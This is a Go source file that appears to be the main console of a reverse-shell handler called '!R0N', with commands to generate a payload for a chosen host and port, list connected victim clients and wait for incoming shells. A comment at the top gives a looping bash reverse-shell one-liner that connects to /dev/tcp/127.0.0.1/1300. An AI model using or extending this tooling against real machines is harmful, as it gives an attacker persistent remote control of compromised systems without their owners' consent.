package main

import (
	"fmt"
	"os"
	"os/signal"
	"strings"
	"time"
)

// while true; do bash -c 'bash -i >& /dev/tcp/127.0.0.1/1300 0>&1'; sleep 10; done
func main() {

	
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)
	go func(){
		for sig := range c {
			_ = sig

			if canexit {
				stop = false
			} else {
				os.Exit(0)
			}
		}
	}()


	if len(os.Args) > 1 {
		_server = os.Args[1]
	}

	go listenf()

	fmt.Printf(logo)

	for {
		fmt.Printf(Fore["GREEN"]+"!R0N :: "+Fore["RESET"])
		var uin string = input()

		if uin == "" {
			continue
		}

		var puin = CommandLineParser(uin)

		switch puin[0] {
			case("mkexploit"):
				var lhost string = strings.Split(_server, ":")[0]
				var lport string = strings.Split(_server, ":")[1]
				for i:=0;i<len(puin);i++ {
					var arg string = puin[i];
					if i != 0 {
						if strings.Contains(arg, "=") {
							if strings.HasPrefix(strings.ToLower(arg), "lhost") {
								lhost = strings.Split(strings.ToLower(arg), "=")[1]
							} else if strings.HasPrefix(strings.ToLower(arg), "lport") {
								lport = strings.Split(strings.ToLower(arg), "=")[1]
							}
						}
					}
				}

				if len(lhost) < 1 {
					lhost = "127.0.0.1"
				}

				fmt.Printf(mkexploit(lhost, lport)+"\n")
			
			case("help"):
				fmt.Printf(help_text)
			case("show"):
				show_clients()
			case("exploit"):
				var lhost string = strings.Split(_server, ":")[0]
				for i:=0;i<len(puin);i++ {
					var arg string = puin[i];
					if i != 0 {
						if strings.Contains(arg, "=") {
							if strings.HasPrefix(strings.ToLower(arg), "lhost") {
								lhost = strings.Split(strings.ToLower(arg), "=")[1]
							}
						}
					}
				}

				if len(lhost) < 1 {
					v_client = "*"
				} else {
					v_client = lhost
				}

				fmt.Println(Fore["BLUE"]+"[*] Waiting for a connection"+Fore["RESET"])

				stop = true
				
				for {
					if stop {
						time.Sleep(time.Second*1)
					} else {
						break;
					}
				}
			case("exit"):
				os.Exit(0)
			default:
				fmt.Println(Fore["RED"]+"[-] Command not found"+Fore["RESET"])
		}


	}
}